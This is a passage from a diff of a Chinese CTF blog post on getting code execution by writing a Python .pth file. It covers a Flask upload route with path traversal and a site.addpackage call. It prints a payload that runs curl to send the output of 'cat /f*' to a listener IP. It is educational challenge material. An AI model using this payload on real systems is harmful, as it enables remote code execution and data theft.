class="hljs-string">&quot;submit&quot;</span>&gt;</span>Add Package<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>简单分析一下代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br>    f = request.files[<span class="hljs-string">&quot;data&quot;</span>]<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;/tmp/storage/<span class="hljs-subst">&#123;f.filename&#125;</span>&#x27;</span>, <span class="hljs-string">&#x27;wb+&#x27;</span>) <span class="hljs-keyword">as</span> destination:<br>        destination.write(f.read())<br>    <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&quot;File is uploaded!&quot;</span>, <span class="hljs-number">200</span>)<br><br>...<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/add&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>    site_dir = <span class="hljs-string">&quot;/tmp/extract&quot;</span><br>    name = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>)<br>    site.addpackage(site_dir, name, <span class="hljs-literal">None</span>)<br></code></pre></td></tr></table></figure>
+
+<p>在文件上传这里是将上传文件存储到 <code>/tmp/storage</code> 目录下，但是这里没有限制，存在<strong>目录穿越漏洞</strong></p>
+<p>所以我们可以上传文件名：<code>../extract/1.pth</code>，内容为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os;os.popen(<span class="hljs-string">&#x27;curl http://192.168.56.128:9000?a=`cat /f*`&#x27;</span>).read()<br></code></pre></td></tr></table></figure>
+
+<p>这样在 add路由 我们就会将 <code>/tmp/extract</code> 目录下面的 <code>1.pth</code> 添加到 <code>模块搜索路径</code> 中</p>
+<p>当执行python时，就会执行命令</p>
+<p><strong>步骤：</strong></p>
+<p>我们上传一个文件： <code>../extract/1.pth</code></p>
+<p><img src="https://s2.loli.net/2023/05/27/IuNvyOlFWnbox1D.png" srcset="/img/loading.gif" lazyload alt="image-20230527161530186"></p>
+<p>然后在虚拟机开启监听9000端口：</p>
+<p><img src="https://s2.loli.net/2023/05/27/yhsLS1CUDQ8ENgf.png" srcset="/img/loading.gif" lazyload alt="image-20230527161611275"></p>
+<p>接着我们点击 add 添加模块</p>
+<p><img src="https://s2.loli.net/2023/05/27/EZ1S9boDIUfimBz.png" srcset="/img/loading.gif" lazyload alt="image-20230527161638748"></p>
+<p>成功把flag外带出来：</p>
+<p><img src="https://s2.loli.net/2023/05/27/JRzauMpoW2ylFh7.png" srcset="/img/loading.gif" lazyload alt="image-20230527161729793"></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/site.html">site-指定域配置钩子</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.sonarsource.com/blog/pretalx-vulnerabilities-how-to-get-accepted-at-every-conference/">Code Execution via Site-Specific Configuration Hooks</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Nestar/p/17336664.html">Python pth 文件写入 getshell 或权限维持</a></p>
+<p><a target="_blank" rel="noopener" href="https://y4er.com/posts/python-pth-file-write-getshell/">Python pth文件写入getshell</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/pth%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5getshell/" class="print-no-link">#pth文件写入getshell</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>pth文件写入getshell</div>
+      <div>https://leekosss.github.io/2023/08/24/pth文件写入getshell/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>leekos</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年8月24日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2023年6月5日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/08/24/Quine%E6%B3%A8%E5%85%A5/" title="Quine注入">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Quine注入</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/08/24/picoCTF2023/" title="picoCTF2023">
+                        <span class="hidden-mobile">picoCTF2023</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"e5J90iDkXMWhU5UNlEX1I2hO-gzGzoHsz","appKey":"esLROw9j3xLk2nV4tQkKaih1","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      赣ICP备2022008842号-2
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
